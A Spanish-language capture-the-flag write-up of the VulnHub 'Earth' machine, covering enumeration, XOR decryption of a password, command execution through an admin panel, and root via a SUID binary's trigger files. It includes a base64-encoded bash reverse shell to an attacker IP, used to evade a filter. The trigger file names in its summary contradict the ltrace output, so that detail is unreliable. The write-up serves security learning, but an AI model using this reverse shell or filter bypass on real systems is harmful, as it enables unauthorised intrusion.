---
title: "Earth VulnHub - writeup"
date: 2026-05-14 12:00:00 -0400
categories: [Writeups, VulnHub]
tags: [web, cifrado, XOR, certificado ssl, virtual hosting, WAF bypass, abuso de binario, analisis de binario]
image:
  path: /assets/img/Earth/banner.jpg
  alt: "Earth banner"
---

En esta publicación se relatará cómo se resolvió la máquina Earth de la plataforma VulnHub.

| Autor | Dificultad | Sistema operativo | Plataforma |
|-------|------------|-------------------|------------|
| SirFlash | Fácil | Linux | VulnHub |

# Resumen ejecutivo
La máquina Earth presenta tres servicios activos: SSH en el puerto 22, HTTP en el puerto 80 y HTTPS en el puerto 443. La fase de reconocimiento inicial permite identificar dos hostnames mediante el certificado SSL: `earth.local` y `terratest.earth.local`. La enumeración del archivo `robots.txt` en el subdominio de pruebas revela la existencia de notas de desarrollo en `/testingnotes.txt`, donde se expone el usuario `terra` y se menciona un sistema de mensajería que emplea cifrado XOR. Al analizar los mensajes cifrados en `earth.local` y compararlos con el contenido de `testdata.txt` mediante una operación XOR, se logra obtener la contraseña `earthclimatechangebad4humans`.

Con estas credenciales se accede al panel de administración en `earth.local/admin`, el cual dispone de una interfaz para la ejecución de comandos. A pesar de las restricciones del entorno, se consigue una shell reversa tras codificar el payload en Base64 para evadir filtros. En la fase de post-explotación, se localiza el binario SUID `/usr/bin/reset_root`. El análisis mediante `ltrace` determina que el binario falla si no existen ciertos archivos en el sistema; tras crear manualmente los triggers `/dev/shm/kzh_02`, `/dev/shm/ycX_q9` y `/tmp/gh_08`, la ejecución del binario restablece la contraseña de root a un valor conocido, permitiendo el escalado total de privilegios. Debido a la necesidad de realizar criptoanálisis básico y reversing ligero, la máquina se clasifica como dificultad fácil.


---

## Hosts discovery (descubrimiento de hosts)

![](/assets/img/Earth/1.png)

---

## Enumeración

```bash
# Nmap 7.99 scan initiated Sun May 10 03:05:50 2026 as: /usr/lib/nmap/nmap -p 22,80,443 -sCV -sS -Pn -vvv -oN nmap.txt -oX nmap.xml 192.168.0.183
Nmap scan report for earth (192.168.0.183)
Host is up, received arp-response (0.00030s latency).
Scanned at 2026-05-10 03:05:50 -04 for 15s

PORT    STATE SERVICE  REASON         VERSION
22/tcp  open  ssh      syn-ack ttl 64 OpenSSH 8.6 (protocol 2.0)
| ssh-hostkey: 
|   256 5b:2c:3f:dc:8b:76:e9:21:7b:d0:56:24:df:be:e9:a8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKPfhMLiVGrmuwlz9rx/UAEXrre+sPMkyOxfOLyH0ghmVuDOqg/PCx3Mu5Gw1K/mwFxPc662JKeGcwcaQ0j13qs=
|   256 b0:3c:72:3b:72:21:26:ce:3a:84:e8:41:ec:c8:f8:41 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOFcnJNVluex1Y3TV86t7w42tFj8JupDpcN9OhZ878U2
80/tcp  open  http     syn-ack ttl 64 Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
|_http-title: Bad Request (400)
|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
443/tcp open  ssl/http syn-ack ttl 64 Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=earth.local/stateOrProvinceName=Space/localityName=Milky Way
| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local
| Issuer: commonName=earth.local/stateOrProvinceName=Space/localityName=Milky Way
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-10-12T23:26:31
| Not valid after:  2031-10-10T23:26:31
| MD5:     4efa 65d2 1a9e 0718 4b54 41da 3712 f187
| SHA-1:   04db 5b29 a33f 8076 f16b 8a1b 581d 6988 db25 7651
| SHA-256: e85f 5eac 6004 faef 0317 41fb 8f0c 8f3c ede4 56aa f485 41ce d5c4 822d 609c 04f6
| -----BEGIN CERTIFICATE-----
| MIIFhjCCA26gAwIBAgIUZZZYScVhllOGdJWBnhMx5ztnlkcwDQYJKoZIhvcNAQEL
| BQAwOjEOMAwGA1UECAwFU3BhY2UxEjAQBgNVBAcMCU1pbGt5IFdheTEUMBIGA1UE
| AwwLZWFydGgubG9jYWwwHhcNMjExMDEyMjMyNjMxWhcNMzExMDEwMjMyNjMxWjA6
| MQ4wDAYDVQQIDAVTcGFjZTESMBAGA1UEBwwJTWlsa3kgV2F5MRQwEgYDVQQDDAtl
| YXJ0aC5sb2NhbDCCAiIwDQYJKoZIhvcNAQEBBQADggIPADCCAgoCggIBAMqFZz4K
| O71xGgMvMuvefKWV4oZtq4qz6Y+Jq6nQ03zyZEsNSuGsKlBmZM54+hUGyNOOUScd
| PL4kUBX0uMujUxq1XKceeg5gJ/kMEAKbe8bqzyN/tPNJ4aCM00fryP/+zDR9fSFZ
| lGF3Xd+pmvLZz+D4CLVJDe5sEVoXIdtlg338gDVrCfkFUzl1uDTB4kPmLPu60LUP
| 4FNUWb2FY2HgQcHIIn6HuQ7GhHVnuNbfPn0PCX5ugGC9XxQq8XzwZs51bprdTU8x
| KaPkQKIJ60sGIS1xzgiLH5s2hkX5LW5u9V2mwqQ4CNS4FFMAbZl66NqPU08OuFau
| HLp/NDdixZPequLZGjIS/JjfYkNKHElzoMgLk5qvqFt9YpPX4ktfGteX8TsfF+pP
| ZdcudBC6BbODNTc+Wr+wLKe9OLZo1/EfJqHUH0h0Jwcrdfr/zOc77GzYhsdkSdiY
| GXZy48BkVV/kmWsMDK6W5Cs2rJx5DmC7ugt14KkzYv6Vv/o5uUtJjRypBjQ/htmR
| oo5mcKGaiohwCfR7T/lL1lA0Tq+cDYwATadudMQ8dgRmf099HO2iFXG4nqE+nacC
| ezfDR8qTXZDUaoTWUFAxI6Bp4M3BCae6x9S+LM6KF6ZoNZ4VroYDD/iub16Ci1FP
| biz6gaBX9iA/tBH6ubcW2V39EHgIswhwR0RtAgMBAAGjgYMwgYAwHQYDVR0OBBYE
| FCX2FKvs/3HZedJN9wbc5w/o884/MB8GA1UdIwQYMBaAFCX2FKvs/3HZedJN9wbc
| 5w/o884/MA8GA1UdEwEB/wQFMAMBAf8wLQYDVR0RBCYwJIILZWFydGgubG9jYWyC
| FXRlcnJhdGVzdC5lYXJ0aC5sb2NhbDANBgkqhkiG9w0BAQsFAAOCAgEAmOynGBnK
| GaLm68D50Xd0mKJlyjpHrI1I97btr7iNKa0UOfSBOutDPyN51j2ibyG/Eq9lVyS3
| DUEzG3PezGOP0EI8mmT92CqkPfc3+R6NL0q/+tszxgGPPmy66T8L/o+nHgUCrDbO
| Ypa8DPhha7HFIVhlJC49PJI9/M8r6UqrJEWW1lJSSd3uSxyfrbt5YkxBAsaJQ9w5
| RgnAYYr4v/a+icwzNov9YdW2mqGl0NuKh6henh+T+4ctAz3aLsUL2rJni17/Tp1q
| 6cxFkoNbbN6vTG7GjC0Mtqukbn9JIIfvWXQf7xWVIJIkvedhMDoikYE0tTeM8Vkz
| GngVRaziwCRdG4ur8ZztqHXMemhQ+TVqxOobTgc1NDIoMjhF1xwfbh2lSi/5px3/
| iN3D80mJ32x19p8/A+b9dk1kMWTfT46FBrl3UeF4VgzLVsVL2QQWNDZmzo0d4k7B
| Fn8Uzyzj7Tr1/R0oEL2Z75z2mZV9uClek7OLSarXFVQQOVgyXRbhG3+Q1AtVndur
| IdII4FThlEP3jnSAEin1dnKgsuGjz+8olmsyqu9p0xkv3iVvM1ErD/TnNUhAZGou
| ScfxACsYU2ZX8XKF/QyS35pgkR6/zJGashm/M9MMV8NN1AkhoQ0CwFzCcrQsGZjd
| S6cvQe6K0mUe4pdZwTYd2T0de4jpofXbWms=
|_-----END CERTIFICATE-----
|_http-title: Bad Request (400)
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
MAC Address: B4:8C:9D:DB:51:E5 (AzureWave Technology)

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May 10 03:06:05 2026 -- 1 IP address (1 host up) scanned in 15.10 seconds
```

| Vector | Servicio (Puerto) | Versión                               | Qué permite                           | Qué intentar        | Notas |
| ------ | ----------------- | ------------------------------------- | ------------------------------------- | ------------------- | ----- |
| 1      | ssh (22)          | OpenSSH 8.6                           | Acceso autenticado hacia la máquina   | Buscar credenciales |       |
| 2      | http (80)         | Apache httpd 2.4.51                   | Gran abanico de vulnerabilidades web  |                     |       |
| 3      | ssl/http (443)    | Apache httpd 2.4.51 / OpenSSL/1.1.1l  | Gran abanico de vulnerabilidades web  |                     |       |

### http y https

Al dirigirme hacia la página expuesta en el puerto 80 me encuentro con un mensaje de error `Bad Request (400)`, así que se procede a hacer una verificación del certificado SSL usando la herramienta `openssl` con el siguiente comando:

```bash
❯ openssl s_client -connect 192.168.0.183:443
```

De esta enumeración del certificado SSL podemos extraer la siguiente información relevante:

- **Dominios:** En texto claro vemos el dominio `earth.local` y en el bloque en base64 podemos ver el subdominio `terratest.earth.local`

### earth.local

Al entrar a la página somos recibidos con lo siguiente:

![](/assets/img/Earth/2.png)

Aquí podemos ver un panel que, luego de analizar un poco los mensajes que contiene, podemos determinar que usa cifrado XOR. XOR es un método criptográfico simétrico simple que aplica la operación lógica "OR exclusivo" entre cada byte de un texto y una clave, siendo reversible al aplicar la misma clave nuevamente. De momento, sin las claves para revertir el cifrado no puedo hacer mucho, por lo que paso hacia el subdominio `terratest.earth.local`.

Además tenemos un panel de login, pero todavía no tenemos credenciales.

### terratest.earth.local

Al entrar podemos ver lo siguiente:

![](/assets/img/Earth/3.png)

Lo primero que hago es enumerar directorios y archivos con `gobuster`, encontrando así `robots.txt`, que contiene lo siguiente:

```
User-Agent: *
Disallow: /*.asp
Disallow: /*.aspx
Disallow: /*.bat
Disallow: /*.c
Disallow: /*.cfm
Disallow: /*.cgi
Disallow: /*.com
Disallow: /*.dll
Disallow: /*.exe
Disallow: /*.htm
Disallow: /*.html
Disallow: /*.inc
Disallow: /*.jhtml
Disallow: /*.jsa
Disallow: /*.json
Disallow: /*.jsp
Disallow: /*.log
Disallow: /*.mdb
Disallow: /*.nsf
Disallow: /*.php
Disallow: /*.phtml
Disallow: /*.pl
Disallow: /*.reg
Disallow: /*.sh
Disallow: /*.shtml
Disallow: /*.sql
Disallow: /*.txt
Disallow: /*.xml
Disallow: /testingnotes.*
```

Aquí lo más interesante es `/testingnotes.*`. Al acceder encontramos el siguiente mensaje:

```
Testing secure messaging system notes:
*Using XOR encryption as the algorithm, should be safe as used in RSA.
*Earth has confirmed they have received our sent messages.
*testdata.txt was used to test encryption.
*terra used as username for admin portal.
Todo:
*How do we send our monthly keys to Earth securely? Or should we change keys weekly?
*Need to test different key lengths to protect against bruteforce. How long should the key be?
*Need to improve the interface of the messaging interface and the admin panel, it's currently very basic.
```

De aquí podemos extraer información importante: tenemos un usuario `terra` y un archivo `testdata.txt` para descifrar los mensajes.

El archivo `testdata.txt` contiene lo siguiente:

```
According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.
```

Para descifrar el texto codificado se optó por usar un script simple de Python:

```python
def xor_decrypt(hex_ciphertext, key):
    ciphertext = bytes.fromhex(hex_ciphertext)
    key_bytes = key.encode()
    decrypted = bytes([ciphertext[i] ^ key_bytes[i % len(key_bytes)] for i in range(len(ciphertext))])
    return decrypted.decode(errors='ignore')

string = input("string: ")
key = "According to radiometric dating..." # testdata.txt
print(xor_decrypt(string, key))
```

Con esto pude descifrar las 3 cadenas de texto que se encontraban originalmente en la página y conseguir una contraseña válida en texto claro: `earthclimatechangebad4humans`.

---

## Explotación

Ya con las credenciales `terra:earthclimatechangebad4humans` podemos iniciar sesión en el panel de login situado en `https://earth.local/admin`:

![](/assets/img/Earth/4.png)

Aquí tenemos un RCE como el usuario `apache`, por lo que para proceder con más comodidad procedo a enviarme una shell.

---

## Post Explotación

Para poder entablar la reverse shell se optó por usar el siguiente comando:

```bash
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTMxLzQ0NDQgMD4mMQo=" | base64 -d | sh
```

Ya que por detrás se hace algún tipo de validación que bloquea conexiones directas:

![](/assets/img/Earth/5.png)

---

## Escalada de privilegios

Al momento de buscar binarios con privilegios SUID podemos visualizar un binario personalizado:

```bash
-rwsr-xr-x. 1 root root  24552 Oct 12  2021 /usr/bin/reset_root
```

Al ejecutarlo vemos la siguiente salida:

```
CHECKING IF RESET TRIGGERS PRESENT...
RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.
```

Con esto en mente me transferí el binario hacia mi máquina atacante para analizarlo.

### Análisis del binario

Lo primero que hice fue un análisis dinámico con `ltrace` para interceptar las llamadas que hace el binario hacia bibliotecas dinámicas, lo que me permitió ver la siguiente información:

```bash
❯ ltrace ./reset_root       
puts("CHECKING IF RESET TRIGGERS PRESE"...CHECKING IF RESET TRIGGERS PRESENT...
)                                                                          = 38
access("/dev/shm/kHgTFI5G", 0)                                                                                       = -1
access("/dev/shm/Zw7bV9U5", 0)                                                                                       = -1
access("/tmp/kcM0Wewe", 0)                                                                                           = -1
puts("RESET FAILED, ALL TRIGGERS ARE N"...RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.
)                                                                          = 44
+++ exited (status 0) +++
```

El binario hace una llamada hacia 3 archivos dentro de la máquina. ¿Por qué?

Si usamos `ghidra` para reconstruir el binario podemos ver la siguiente sección de código relevante:

```c
magic_cipher(&local_1098,local_58,local_1078,0x11,0x12);
  local_1067 = 0;
  iVar1 = access(local_1078,0);
  if (iVar1 == 0) {
    local_c = local_c + 1;
  }
  magic_cipher(&local_10b8,local_58,local_1078,0x11,0x12);
  local_1067 = 0;
  iVar1 = access(local_1078,0);
  if (iVar1 == 0) {
    local_c = local_c + 1;
  }
  magic_cipher(&local_10c5,local_58,local_1078,0xd,0x12);
  local_106b = 0;
  iVar1 = access(local_1078,0);
  if (iVar1 == 0) {
    local_c = local_c + 1;
  }
  if (local_c == 3) {
    puts("RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth");
    setuid(0);
    system("/usr/bin/echo \'root:Earth\' | /usr/sbin/chpasswd");
  }
  else {
    puts("RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.");
  }
```

Esta parte del binario es la más importante para entender su funcionamiento: valida la existencia de 3 archivos y, si todos existen, ejecuta `/usr/bin/echo 'root:Earth' | /usr/sbin/chpasswd`, cambiando la contraseña del usuario `root` a `Earth`.

Con esto en cuenta solo tenemos que crear los 3 archivos identificados con `ltrace` y ejecutar el binario:

```
CHECKING IF RESET TRIGGERS PRESENT...
RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth
```

![](/assets/img/Earth/6.png)